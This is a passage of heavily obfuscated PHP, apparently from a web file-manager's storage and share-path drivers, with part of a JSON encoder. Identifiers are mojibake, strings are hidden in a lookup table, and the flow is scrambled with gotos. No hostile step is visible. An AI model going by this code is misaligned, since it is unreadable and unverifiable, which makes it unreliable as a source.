$b¤‘Øã¼ø”[$_SERVER[çŞáÓæÚô‚Ô‡][472]] : !1; } public function getPathName($BÃµ©óĞƒ) { $AÍÅîÁ‡å = $this->infoSimple($BÃµ©óĞƒ); return $AÍÅîÁ‡å ? $AÍÅîÁ‡å[$_SERVER[çŞáÓæÚô‚Ô‡][38]] : !1; } public function getPathOuter($dÙöå±Å¡Û) { if (!$dÙöå±Å¡Û) { return $dÙöå±Å¡Û; } $A•Šìöˆö = $this->parse($dÙöå±Å¡Û); return KodIO::make($A•Šìöˆö[$_SERVER[çŞáÓæÚô‚Ô‡][376]]); } public function copyFolderFromIO($Aªæà÷ñâ, $cØ¡Â³”ÄÃ, $dÄĞéó¸†, $F¸ŠÑ”ƒæ÷, $FœÈ°ê°å) { $c‹Á‚ã²Æ¡ = $this->model->copyFolderFromIO($Aªæà÷ñâ, $cØ¡Â³”ÄÃ, $dÄĞéó¸†, $F¸ŠÑ”ƒæ÷, $FœÈ°ê°å); return KodIO::make($c‹Á‚ã²Æ¡); } public function isParentOf($D¨ÔÔĞ¨‹, $b¡±»ôƒøÀ) { return $this->model->isParentOf($D¨ÔÔĞ¨‹, $b¡±»ôƒøÀ); } public function mkfile($b«‚Š°ƒ¾ß, $b–½Å¯î‡¹ = '', $fëŠˆ§Ô = REPEAT_RENAME) { $BĞÊöøâŠî =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fŞœ—“ã¯× = $this->parse($b«‚Š°ƒ¾ß); $b«‚Š°ƒ¾ß = $fŞœ—“ã¯×[$BĞÊöøâŠî[376]]; for ($eğÓÓ©À½Ê = 0; $eğÓÓ©À½Ê < count($fŞœ—“ã¯×[$BĞÊöøâŠî[1125]]); $eğÓÓ©À½Ê++) { $BïÒŸ™¥Íø = $fŞœ—“ã¯×[$BĞÊöøâŠî[1125]][$eğÓÓ©À½Ê]; if ($eğÓÓ©À½Ê == count($fŞœ—“ã¯×[$BĞÊöøâŠî[1125]]) - 1) { $b«‚Š°ƒ¾ß = $this->model->mkfile($b«‚Š°ƒ¾ß, $BïÒŸ™¥Íø, $b–½Å¯î‡¹, $fëŠˆ§Ô); break; } $b«‚Š°ƒ¾ß = $this->model->mkdir($b«‚Š°ƒ¾ß, $BïÒŸ™¥Íø, REPEAT_SKIP); } return $this->getPathOuter($b«‚Š°ƒ¾ß); } public function mkdir($EäºÓ ™‹†, $BÆŠÖçá·Î = REPEAT_SKIP) { $E­»«…Œ‘Ù =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AŠ˜®§Î«Š = $this->parse($EäºÓ ™‹†); $EäºÓ ™‹† = $AŠ˜®§Î«Š[$E­»«…Œ‘Ù[376]]; for ($c×çÔ„ÂÓ = 0; $c×çÔ„ÂÓ < count($AŠ˜®§Î«Š[$E­»«…Œ‘Ù[1125]]); $c×çÔ„ÂÓ++) { $fî†‘§ğˆ = $AŠ˜®§Î«Š[$E­»«…Œ‘Ù[1125]][$c×çÔ„ÂÓ]; $EäºÓ ™‹† = $this->model->mkdir($EäºÓ ™‹†, $fî†‘§ğˆ, $BÆŠÖçá·Î); } return $this->getPathOuter($EäºÓ ™‹†); } public function copyFile($AŒ¹Ê“¢‚ö, $CïÈ¶ğè, $DÉµ¥÷ = REPEAT_REPLACE) { $cá¦åºÑ² =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f‹ “ÜİÌÔ = $this->parse($CïÈ¶ğè); $Bëñ…åÚ‰ˆ = $this->model->copy($AŒ¹Ê“¢‚ö, $f‹ “ÜİÌÔ[$cá¦åºÑ²[376]], $DÉµ¥÷, $f‹ “ÜİÌÔ[$cá¦åºÑ²[85]]); return $Bëñ…åÚ‰ˆ ? $this->getPathOuter($Bëñ…åÚ‰ˆ) : !1; } public function moveFile($a¢—â©ò¶à, $fÖÄñ¾÷ˆ, $A†§ £Ùùà = REPEAT_REPLACE) { $CÍ½•ò‰é¸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B«†í¸ƒœ´ = $this->parse($fÖÄñ¾÷ˆ); $f¨éó¤­¼§ = $this->model->move($a¢—â©ò¶à, $B«†í¸ƒœ´[$CÍ½•ò‰é¸[376]], $A†§ £Ùùà, $B«†í¸ƒœ´[$CÍ½•ò‰é¸[85]]); return $f¨éó¤­¼§ ? $this->getPathOuter($f¨éó¤­¼§) : !1; } public function copy($aáë×Ã›…, $F“Ò–”éÖƒ, $CÙô·½ç‘¸ = REPEAT_REPLACE) { $CÔ‚¼“ââ = $this->parse($F“Ò–”éÖƒ); $c„Â²²ìÙÕ = $this->model->copy($aáë×Ã›…, $CÔ‚¼“ââ[$_SERVER[çŞáÓæÚô‚Ô‡][376]], $CÙô·½ç‘¸); return $c„Â²²ìÙÕ ? $this->getPathOuter($c„Â²²ìÙÕ) : !1; } public function moveSameAllow() { } public function move($bî¢°îİœ, $EÑó‡‰ö±, $Bìåç­×ñ = REPEAT_REPLACE) { $böÂ§“šÇ = $this->parse($EÑó‡‰ö±); $b÷ËÖ†Ô³’ = $this->model->move($bî¢°îİœ, $böÂ§“šÇ[$_SERVER[çŞáÓæÚô‚Ô‡][376]], $Bìåç­×ñ); return $b÷ËÖ†Ô³’ ? $this->getPathOuter($b÷ËÖ†Ô³’) : !1; } public function remove($D¦ø‡Øù, $eºî…İÙƒ† = true) { return $this->model->remove($D¦ø‡Øù, $eºî…İÙƒ†); } public function rename($B‰„½íŠ¤¿, $D„èÂ›¹ŒÆ) { $dŠöæÚ«›Ì = $this->model->rename($B‰„½íŠ¤¿, $D„èÂ›¹ŒÆ); return $dŠöæÚ«›Ì ? $this->getPathOuter($B‰„½íŠ¤¿) : $dŠöæÚ«›Ì; } public function size($Eù°‡Âã…) { $d®°•ÓÆÑ = $this->infoSimple($Eù°‡Âã…); return $d®°•ÓÆÑ ? $d®°•ÓÆÑ[$_SERVER[çŞáÓæÚô‚Ô‡][87]] : 0; } public function infoSimple($Eñ¦ˆ¬ÌÛ‰) { return $this->model->sourceInfo($Eñ¦ˆ¬ÌÛ‰); } public function info($FãòºßĞ) { return $this->infoParse($FãòºßĞ); } public function infoAuth($Fë¤„Ø‡…) { return $this->infoParse($Fë¤„Ø‡…, !1, !0); } public function infoWithChildren($c©±Ãğ¹·) { return $this->infoParse($c©±Ãğ¹·, !0); } protected function infoParse($C´›®·»¡½, $C„•êä‰ªõ = false, $b°¦†œèÒ = false) { if (!$C„•êä‰ªõ) { return $this->model->pathInfo($C´›®·»¡½, $b°¦†œèÒ); } return $this->model->pathInfoMore($C´›®·»¡½); } public function infoFull($DµÚ—ïš®†) { $aœŠÌÔÍå‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a¯¿Ş÷‰† = explode($aœŠÌÔÍå‰[18], $DµÚ—ïš®†); $CŸÍ¸ä—ÉÍ = implode($aœŠÌÔÍå‰[18], array_splice($a¯¿Ş÷‰†, 1)); return $this->model->pathInfoByPath($a¯¿Ş÷‰†[0], $CŸÍ¸ä—ÉÍ); } public function hashSimple($bÃ±Ã¾…ËÎ) { $FªŠâªéñ™ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F Î˜é£ò¨ = $this->infoWithChildren($bÃ±Ã¾…ËÎ); return $F Î˜é£ò¨[$FªŠâªéñ™[172]][$FªŠâªéñ™[174]]; } public function hashMd5($ašâ¥‘ŠÁÆ) { $dë„ç„ë›Ö =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eŞ’à½¹ë’ = $this->infoWithChildren($ašâ¥‘ŠÁÆ); return $eŞ’à½¹ë’[$dë„ç„ë›Ö[172]][$dë„ç„ë›Ö[173]]; } public function exist($f×ß±ÛÔêÌ) { $B¡Ï¨ƒî‡à =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Bœï˜Ø í = $this->parse($f×ß±ÛÔêÌ); if (!$Bœï˜Ø í[$B¡Ï¨ƒî‡à[85]]) { return $this->isFile($f×ß±ÛÔêÌ) || $this->isFolder($f×ß±ÛÔêÌ); } $E®ï„²¦Ãã = array($B¡Ï¨ƒî‡à[377] => $Bœï˜Ø í[$B¡Ï¨ƒî‡à[376]], $B¡Ï¨ƒî‡à[38] => $Bœï˜Ø í[$B¡Ï¨ƒî‡à[85]]); $C°ÎÕ†åŸ = $this->model->where($E®ï„²¦Ãã)->find(); return $C°ÎÕ†åŸ ? !0 : !1; } public function isFile($B±«ê¤ÙÅÌ) { $dËæàò‡©° =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E½¦¿§œ“« = $this->infoSimple($B±«ê¤ÙÅÌ); return $E½¦¿§œ“« && $E½¦¿§œ“«[$dËæàò‡©°[379]] == $dËæàò‡©°[93] ? !1 : !0; } public function isFolder($AÛõÖÍê•¢) { $C„¡ÑµšÃ¸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a™§Ö©ø¾ß = $this->infoSimple($AÛõÖÍê•¢); return $a™§Ö©ø¾ß && $a™§Ö©ø¾ß[$C„¡ÑµšÃ¸[379]] == $C„¡ÑµšÃ¸[93] ? !0 : !1; } public function listPath($dŠ›“Ç±›, $CÀ™£Š¸ó¦ = false) { $D…‡‡‚øøˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($dŠ›“Ç±› == $D…‡‡‚øøˆ[43]) { return !1; } $C™¥˜¶îŠÁ = array($D…‡‡‚øøˆ[377] => $dŠ›“Ç±›); if ($CÀ™£Š¸ó¦) { return $this->model->listSource($C™¥˜¶îŠÁ, -1); } return $this->model->listSource($C™¥˜¶îŠÁ); } public function has($BƒŒÊ˜»³Ô, $AÆÎÛˆ­™Ç = false, $dĞÔÅù®†ğ = null) { $bóõ–©†„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CªÀºèäÊ’ = $this->infoWithChildren($BƒŒÊ˜»³Ô); if ($AÆÎÛˆ­™Ç) { return array($bóõ–©†„[202] => $CªÀºèäÊ’[$bóõ–©†„[202]], $bóõ–©†„[201] => $CªÀºèäÊ’[$bóõ–©†„[201]]); } return $dĞÔÅù®†ğ ? $CªÀºèäÊ’[$bóõ–©†„[202]] : $CªÀºèäÊ’[$bóõ–©†„[201]]; } public function listAll($d£ùÜš‹Åï) { $cºÙŠŠ§¿ë = IO::info($this->pathParse[$_SERVER[çŞáÓæÚô‚Ô‡][85]]); if (!$cºÙŠŠ§¿ë) { return array(); } return $this->model->listAll($d£ùÜš‹Åï); } public function getContent($bìàê…å) { return $this->model->getContent($bìàê…å); } public function setContent($F•ê‘™ÇÒ, $fŒ‰š¹í›‡ = '') { return $this->model->setContent($F•ê‘™ÇÒ, $fŒ‰š¹í›‡); } public function fileSubstr($E²¾„ØÉØµ, $dó˜Ÿèóñ, $a¯×Øß¤çË) { return $this->model->fileSubstr($E²¾„ØÉØµ, $dó˜Ÿèóñ, $a¯×Øß¤çË); } public function download($cÒ“Åœ¡ÅÜ, $fŒ˜ÜÌø¥Å = '') { $cÜÅ±Õ¥  = get_path_father($fŒ˜ÜÌø¥Å); $aãÚö­‘é = get_path_this($fŒ˜ÜÌø¥Å); $Bè´æã„‡ë = $this->model->fileInfoGet($cÒ“Åœ¡ÅÜ); $CÕ«ì£¬Š = IO::copy($Bè´æã„‡ë[$_SERVER[çŞáÓæÚô‚Ô‡][85]], $cÜÅ±Õ¥ , !1, $aãÚö­‘é); return $CÕ«ì£¬Š; } public function setModifyTime($fÃ²ëÛÑ™, $bõ‡Òã¥…Ş = '') { $this->model->metaSet($fÃ²ëÛÑ™, $_SERVER[çŞáÓæÚô‚Ô‡][1126], $bõ‡Òã¥…Ş); } public function upload($AîŒôµ´ö‡, $b†ªòÉŸµ¶, $F©™½ß¶‰“ = false, $aÑƒµ¹’ùº = REPEAT_REPLACE) { $Dª¹É¤Ê’ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fÒËí—çÍ = $this->parse($AîŒôµ´ö‡); $cÇ‰ìÕëé = $this->model->addFile($fÒËí—çÍ[$Dª¹É¤Ê’[376]], $b†ªòÉŸµ¶, $fÒËí—çÍ[$Dª¹É¤Ê’[85]], $F©™½ß¶‰“, $aÑƒµ¹’ùº); return $this->getPathOuter($cÇ‰ìÕëé); } public function uploadFileByID($a™¬Ÿ«œøŞ, $f¹ÇÓÆíƒå, $D•„ç¼Éµ) { $DÓ¾×ëÙ„± =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b‘”ïäÈœ = $this->parse($a™¬Ÿ«œøŞ); $DÎ…ïÆˆÜÛ = $this->model->addFileByFileID($b‘”ïäÈœ[$DÓ¾×ëÙ„±[376]], $f¹ÇÓÆíƒå, $b‘”ïäÈœ[$DÓ¾×ëÙ„±[85]], $D•„ç¼Éµ); return $this->getPathOuter($DÎ…ïÆˆÜÛ); } public function addFileByRemote($bŒ±ÙÕİ, $AÁÂ¬ŒÑÕ„, $Cæ—²‹¨ó = array(), $cØÜº¹ƒâÒ = '', $A¸É’‹ÍËÇ) { $d‡ñäïˆŠ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cêó•À¼Ç = $this->parse($bŒ±ÙÕİ); $cØÜº¹ƒâÒ = empty($cØÜº¹ƒâÒ) ? $cêó•À¼Ç[$d‡ñäïˆŠ[85]] : $cØÜº¹ƒâÒ; $Eµ—Ú¦ÁÜÚ = $this->model->addFileByRemote($cêó•À¼Ç[$d‡ñäïˆŠ[376]], $AÁÂ¬ŒÑÕ„, $cØÜº¹ƒâÒ, $Cæ—²‹¨ó, $A¸É’‹ÍËÇ); return $this->getPathOuter($Eµ—Ú¦ÁÜÚ); } public function uploadLink($d¸°ªï»†ã, $d²æÃ¤òÑ = 0) { $eĞ™ºÆğ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cÀÌØ‹Ï®— = $this->parse($d¸°ªï»†ã); $d¸°ªï»†ã = Model($eĞ™ºÆğ[555])->createFileName($cÀÌØ‹Ï®—[$eĞ™ºÆğ[85]]); $d­‰¯¹âà = IO::uploadLink($d¸°ªï»†ã, $d²æÃ¤òÑ); return $d­‰¯¹âà; } public function fileNameAuto($d–‡ç²ÅºÓ, $DİòÍä‰Ç, $BÇ¢‘‡©ˆã = REPEAT_REPLACE, $c«Ÿ…Ì¥‘Å = false) { return $this->model->fileNameAuto($d–‡ç²ÅºÓ, $DİòÍä‰Ç, $BÇ¢‘‡©ˆã, $c«Ÿ…Ì¥‘Å); } public function fileNameExist($E©Õ…âÌÀè, $d•Ñêá³) { return $this->model->fileNameExist($E©Õ…âÌÀè, $d•Ñêá³); } protected function _fileOut($e¯¶ß‰ñË, $c…¿ÅòÄƒ = false, $Aô÷µÀ¬—Œ = false, $DÛ‹¼âË¥ = '', $f™øù¿Æ³ = false) { goto CòõË‚’; eÓº´Õ…—Ö: $fª¥–±íùğ = $this->model->fileInfoGet($e¯¶ß‰ñË); $DÛ‹¼âË¥ = $fª¥–±íùğ[$eÚëÎéÌ³×[173]] ? $fª¥–±íùğ[$eÚëÎéÌ³×[173]] : $DÛ‹¼âË¥; $E“Ó¬Á¡Ô‹ = isset($GLOBALS[$eÚëÎéÌ³×[1128]]) ? $GLOBALS[$eÚëÎéÌ³×[1128]] : $Dù¾§Ó¯[$eÚëÎéÌ³×[38]]; goto bÅª£½ó‰; CòõË‚’: $eÚëÎéÌ³× =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Dù¾§Ó¯ = $this->model->sourceInfo($e¯¶ß‰ñË); if ($Dù¾§Ó¯[$eÚëÎéÌ³×[379]] == $eÚëÎéÌ³×[93]) { header($eÚëÎéÌ³×[1127]); die; } goto eÓº´Õ…—Ö; bÅª£½ó‰: if ($f™øù¿Æ³) { return IO::fileOutServer($fª¥–±íùğ[$eÚëÎéÌ³×[85]], $c…¿ÅòÄƒ, $E“Ó¬Á¡Ô‹, $DÛ‹¼âË¥); } IO::fileOut($fª¥–±íùğ[$eÚëÎéÌ³×[85]], $c…¿ÅòÄƒ, $E“Ó¬Á¡Ô‹, $DÛ‹¼âË¥); goto dÄ²¥ÖÕ«; dÄ²¥ÖÕ«: } public function fileOut($a÷Ó›“´ù©, $Dôà¨ÃÙÔñ = false, $d‚ß–ôÖÇ = false, $BĞÆ›·µíÅ = '') { $this->_fileOut($a÷Ó›“´ù©, $Dôà¨ÃÙÔñ, $d‚ß–ôÖÇ, $BĞÆ›·µíÅ); } public function fileOutServer($eÈÔ‘ƒ§„, $Aù­ˆ§Ã»Š = false, $e¹É¨åìƒ = false, $B„Ÿ©¾ÖĞ = '') { $this->_fileOut($eÈÔ‘ƒ§„, $Aù­ˆ§Ã»Š, $e¹É¨åìƒ, $B„Ÿ©¾ÖĞ, !0); } protected function _fileOutImage($EÌÅõÃƒ®, $AÊİğˆÇìÑ = 250) { $Cù´Š´Ñ‚Õ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Cøô‚ˆì¾ = $this->model->sourceInfo($EÌÅõÃƒ®); if ($Cøô‚ˆì¾[$Cù´Š´Ñ‚Õ[379]] == $Cù´Š´Ñ‚Õ[93]) { show_json($Cù´Š´Ñ‚Õ[1129] . $EÌÅõÃƒ®, !1); } $GLOBALS[$Cù´Š´Ñ‚Õ[1128]] = $Cøô‚ˆì¾[$Cù´Š´Ñ‚Õ[38]]; $Aó’òŞ³Ë = $this->model->fileInfoGet($EÌÅõÃƒ®); IO::fileOutImage($Aó’òŞ³Ë[$Cù´Š´Ñ‚Õ[85]], $AÊİğˆÇìÑ); } public function fileOutImage($fºèÉÁÔØ…, $c’™…™»• = 250) { $this->_fileOutImage($fºèÉÁÔØ…, $c’™…™»•); } public function fileOutImageServer($FùÂöšß±ø, $f±È…··‚ = 250) { $this->_fileOutImage($FùÂöšß±ø, $f±È…··‚); } public function link($Dõ¨°‚ÑÕ, $cò¸ì˜”‚Œ = '') { $CÁÆÔ³òˆï = $this->model->fileInfoGet($Dõ¨°‚ÑÕ); return IO::link($CÁÆÔ³òˆï[$_SERVER[çŞáÓæÚô‚Ô‡][85]], $cò¸ì˜”‚Œ); } protected function parse($DœÜæâ”¨Ñ) { $F†î‰’›ñÆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (strstr($DœÜæâ”¨Ñ, $F†î‰’›ñÆ[18]) === !1) { return array($F†î‰’›ñÆ[394] => intval($DœÜæâ”¨Ñ), $F†î‰’›ñÆ[85] => $F†î‰’›ñÆ[43], $F†î‰’›ñÆ[1125] => array()); } $dîæãµ²ƒ¾ = explode($F†î‰’›ñÆ[18], trim($DœÜæâ”¨Ñ, $F†î‰’›ñÆ[18])); if (count($dîæãµ²ƒ¾) < 2) { show_tips($DœÜæâ”¨Ñ . $F†î‰’›ñÆ[1130]); } return array($F†î‰’›ñÆ[394] => intval($dîæãµ²ƒ¾[0]), $F†î‰’›ñÆ[85] => $dîæãµ²ƒ¾[1], $F†î‰’›ñÆ[1125] => array_slice($dîæãµ²ƒ¾, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($a©†¬ÓÍìÁ) { $this->pathParse = $a©†¬ÓÍìÁ; $this->model = Model($_SERVER[çŞáÓæÚô‚Ô‡][1124]); } public function getPathOuter($cœÜî¼ïí£) { $DËë°çÊÈ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$cœÜî¼ïí£) { return $cœÜî¼ïí£; } $aìö²¿Å = $this->parse($cœÜî¼ïí£); return trim(KodIO::makeShare($this->pathParse[$DËë°çÊÈ[376]], $aìö²¿Å[$DËë°çÊÈ[376]]), $DËë°çÊÈ[18]); } protected function infoParse($F†Šòğ©ÜÕ, $Bñ†£Á¥øæ = false, $C•ØÕÏ‚’¹ = false) { $DÊŸ×ØÓæ¾ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C˜šˆˆª¿Ğ = $this->pathParse[$DÊŸ×ØÓæ¾[376]]; $dñ¡’ÁõÆ = trim($this->pathParse[$DÊŸ×ØÓæ¾[1019]], $DÊŸ×ØÓæ¾[18]); return Action($DÊŸ×ØÓæ¾[1131])->sharePathInfo($C˜šˆˆª¿Ğ, $dñ¡’ÁõÆ); } public function infoFull($eÅíŸÓ»²Ø) { $cæ«ĞìÉ¨À =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EØõ–Ï§ = explode($cæ«ĞìÉ¨À[18], trim($eÅíŸÓ»²Ø, $cæ«ĞìÉ¨À[18])); if (count($EØõ–Ï§) > 1) { $c¢„¬¾­™ = implode($cæ«ĞìÉ¨À[18], array_splice($EØõ–Ï§, 1)); $cŸì®²…ªØ = $this->model->pathInfoByPath($EØõ–Ï§[0], $c¢„¬¾­™); if (!$cŸì®²…ªØ) { return !1; } $this->pathParse[$cæ«ĞìÉ¨À[1019]] = $cŸì®²…ªØ[$cæ«ĞìÉ¨À[378]]; } return $this->infoParse($eÅíŸÓ»²Ø); } public function listAll($A‹òÃªÖ’) { goto EÊÖÍ‰øÒó; fŞî»”ÍŞå: foreach ($CìâÉñÍ‰¿ as &$fÖÍ¥Öï¬Ï) { check_abort(); $fÖÍ¥Öï¬Ï[$BÙŠçÂí‘[400]] = $aÖê·Æ×™í->_shareItemeParse($fÖÍ¥Öï¬Ï[$BÙŠçÂí‘[400]], $b×Òöë™•ğ); } unset($fÖÍ¥Öï¬Ï); return $CìâÉñÍ‰¿; goto C’ªéî¸Ï«; C¾Ñ¡÷ØÜ: $CìâÉñÍ‰¿ = $this->model->listAll($A‹òÃªÖ’); $b×Òöë™•ğ = Model($BÙŠçÂí‘[547])->getInfo($D¾Ê» ïõÇ[$BÙŠçÂí‘[450]]); $aÖê·Æ×™í = Action($BÙŠçÂí‘[1131]); goto fŞî»”ÍŞå; EÊÖÍ‰øÒó: $BÙŠçÂí‘ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D¾Ê» ïõÇ = IO::info($this->pathParse[$BÙŠçÂí‘[85]]); if (!$D¾Ê» ïõÇ) { return array(); } goto C¾Ñ¡÷ØÜ; C’ªéî¸Ï«: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($e¹è«£ÏµÉ) { $this->pathParse = $e¹è«£ÏµÉ; $this->model = Model($_SERVER[çŞáÓæÚô‚Ô‡][1124]); } protected function infoParse($CØ’ëãçã, $c›±‰¥¸Ãˆ = false, $a¹Åòö½à¹ = false) { $d®£“•ÙÉ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return Action($d®£“•ÙÉ[1025])->sharePathInfo($this->pathParse[$d®£“•ÙÉ[85]], !0); } public function listPath($a’‘ÉöÓŒ¦, $dÆ½¯Ğéˆº = false) { $E‘™šòâŒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B†Ş°ÉˆÍõ = parent::listPath($a’‘ÉöÓŒ¦, $dÆ½¯Ğéˆº); foreach ($B†Ş°ÉˆÍõ as $böÁ´½¦Çì => $FñÌÎĞˆÍ¢) { if (!in_array($böÁ´½¦Çì, array($E‘™šòâŒ[83], $E‘™šòâŒ[84]))) { continue; } foreach ($FñÌÎĞˆÍ¢ as $F‘×•Üá»Ä => $EĞµ‡ÅÇ‰) { $B†Ş°ÉˆÍõ[$böÁ´½¦Çì][$F‘×•Üá»Ä] = Action($E‘™šòâŒ[1025])->shareItemInfo($EĞµ‡ÅÇ‰); } } return $B†Ş°ÉˆÍõ; } public function listAll($e„¦ï†ØŒ) { goto F×ê°ÆÅñ; c¨ˆÇæøÊÚ: return $AÙ¯º«â‘­; goto a™ÌÎ™±ø¼; F×ê°ÆÅñ: $C‘ò¯Ø´ë¨ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d‡«·‚çŸÍ = IO::info($this->pathParse[$C‘ò¯Ø´ë¨[85]]); if (!$d‡«·‚çŸÍ) { return array(); } goto f£Ä†¦’Î; f£Ä†¦’Î: $AÙ¯º«â‘­ = $this->model->listAll($e„¦ï†ØŒ); foreach ($AÙ¯º«â‘­ as &$b¤ßĞÆí“¤) { $b¤ßĞÆí“¤[$C‘ò¯Ø´ë¨[400]] = Action($C‘ò¯Ø´ë¨[1025])->shareItemInfo($b¤ßĞÆí“¤[$C‘ò¯Ø´ë¨[400]]); } unset($b¤ßĞÆí“¤); goto c¨ˆÇæøÊÚ; a™ÌÎ™±ø¼: } } goto cáãáÇ¾•¤; CÄ––Ú£ğì: function beforeShutdownFatalError($B¹°ŒÂİÚ) { think_exception($B¹°ŒÂİÚ); } $_SERVER[$_SERVER[·ü][45]] = $cŠ½’åì ‘($_SERVER[$_SERVER[·ü][42]]); $D¥¦¾ö ¿ƒ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto eèÛÑ¢¤èí; B…¤ç¥Ò™æ: define($_SERVER[çŞáÓæÚô‚Ô‡][1946], 16); define($_SERVER[çŞáÓæÚô‚Ô‡][1947], 32); class Services_JSON { function __construct($C‘¦ìôôì™ = 0) { $this->use = $C‘¦ìôôì™; } function utf162utf8($AÂˆ¾œìšè) { $dµÅ˜Å•ùã =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (function_exists($dµÅ˜Å•ùã[78])) { return mb_convert_encoding($AÂˆ¾œìšè, $dµÅ˜Å•ùã[1596], $dµÅ˜Å•ùã[1948]); } $D‹ÉÛò°ä = ord($AÂˆ¾œìšè[0]) << 8 | ord($AÂˆ¾œìšè[1]); switch (!0) { case (127 & $D‹ÉÛò°ä) == $D‹ÉÛò°ä: return chr(127 & $D‹ÉÛò°ä); case (2047 & $D‹ÉÛò°ä) == $D‹ÉÛò°ä: return chr(192 | $D‹ÉÛò°ä >> 6 & 31) . chr(128 | $D‹ÉÛò°ä & 63); case (65535 & $D‹ÉÛò°ä) == $D‹ÉÛò°ä: return chr(224 | $D‹ÉÛò°ä >> 12 & 15) . chr(128 | $D‹ÉÛò°ä >> 6 & 63) . chr(128 | $D‹ÉÛò°ä & 63); } return $dµÅ˜Å•ùã[43]; } function utf82utf16($Aãçì½×ìÚ) { $cã¤Äí¿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (function_exists($cã¤Äí¿[78])) { return mb_convert_encoding($Aãçì½×ìÚ, $cã¤Äí¿[1948], $cã¤Äí¿[1596]); } switch (strlen($Aãçì½×ìÚ)) { case 1: return $Aãçì½×ìÚ; case 2: return chr(7 & ord($Aãçì½×ìÚ[0]) >> 2) . chr(192 & ord($Aãçì½×ìÚ[0]) << 6 | 63 & ord($Aãçì½×ìÚ[1])); case 3: return chr(240 & ord($Aãçì½×ìÚ[0]) << 4 | 15 & ord($Aãçì½×ìÚ[1]) >> 2) . chr(192 & ord($Aãçì½×ìÚ[1]) << 6 | 127 & ord($Aãçì½×ìÚ[2])); } return $cã¤Äí¿[43]; } function encode($fñ•µÒ‡ò÷) { $bÒ‹ƒ£È± =& $_SERVER[çŞáÓæÚô‚Ô‡]; switch (gettype($fñ•µÒ‡ò÷)) { case $bÒ‹ƒ£È±[1607]: return $fñ•µÒ‡ò÷ ? $bÒ‹ƒ£È±[1606] : $bÒ‹ƒ£È±[1608]; case $bÒ‹ƒ£È±[1949]: return $bÒ‹ƒ£È±[109]; case $bÒ‹ƒ£È±[312]: return (int) $fñ•µÒ‡ò÷; case $bÒ‹ƒ£È±[287]: case $bÒ‹ƒ£È±[286]: return (double) $fñ•µÒ‡ò÷; case $bÒ‹ƒ£È±[321]: $f“ç‰çƒÔˆ = $bÒ‹ƒ£È±[43]; $Aßİ‰‘Â¨¤ = strlen($fñ•µÒ‡ò÷); for ($eÄàº…îÅ¿ = 0; $eÄàº…îÅ¿ < $Aßİ‰‘Â¨¤; ++$eÄàº…îÅ¿) { $Cğ†Á¨­îÓ = ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿]); switch (!0) { case $Cğ†Á¨­îÓ == 8: $f“ç‰çƒÔˆ .= $bÒ‹ƒ£È±[1950]; break; case $Cğ†Á¨­îÓ == 9: $f“ç‰çƒÔˆ .= $bÒ‹ƒ£È±[1583]; break; case $Cğ†Á¨­îÓ == 10: $f“ç‰çƒÔˆ .= $bÒ‹ƒ£È±[1581]; break; case $Cğ†Á¨­îÓ == 12: $f“ç‰çƒÔˆ .= $bÒ‹ƒ£È±[1951]; break; case $Cğ†Á¨­îÓ == 13: $f“ç‰çƒÔˆ .= $bÒ‹ƒ£È±[1582]; break; case $Cğ†Á¨­îÓ == 34: case $Cğ†Á¨­îÓ == 47: case $Cğ†Á¨­îÓ == 92: $f“ç‰çƒÔˆ .= $bÒ‹ƒ£È±[103] . $fñ•µÒ‡ò÷[$eÄàº…îÅ¿]; break; case $Cğ†Á¨­îÓ >= 32 && $Cğ†Á¨­îÓ <= 127: $f“ç‰çƒÔˆ .= $fñ•µÒ‡ò÷[$eÄàº…îÅ¿]; break; case ($Cğ†Á¨­îÓ & 224) == 192: $CÈÄô®©¬˜ = pack($bÒ‹ƒ£È±[1952], $Cğ†Á¨­îÓ, ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 1])); $eÄàº…îÅ¿ += 1; $Bæ½À¿¨¤è = $this->utf82utf16($CÈÄô®©¬˜); $f“ç‰çƒÔˆ .= sprintf($bÒ‹ƒ£È±[1953], bin2hex($Bæ½À¿¨¤è)); break; case ($Cğ†Á¨­îÓ & 240) == 224: $CÈÄô®©¬˜ = pack($bÒ‹ƒ£È±[1952], $Cğ†Á¨­îÓ, ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 1]), ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 2])); $eÄàº…îÅ¿ += 2; $Bæ½À¿¨¤è = $this->utf82utf16($CÈÄô®©¬˜); $f“ç‰çƒÔˆ .= sprintf($bÒ‹ƒ£È±[1953], bin2hex($Bæ½À¿¨¤è)); break; case ($Cğ†Á¨­îÓ & 248) == 240: $CÈÄô®©¬˜ = pack($bÒ‹ƒ£È±[1952], $Cğ†Á¨­îÓ, ord($fñ•µÒ‡ò÷[$eÄàº…îÅ¿ + 1]), 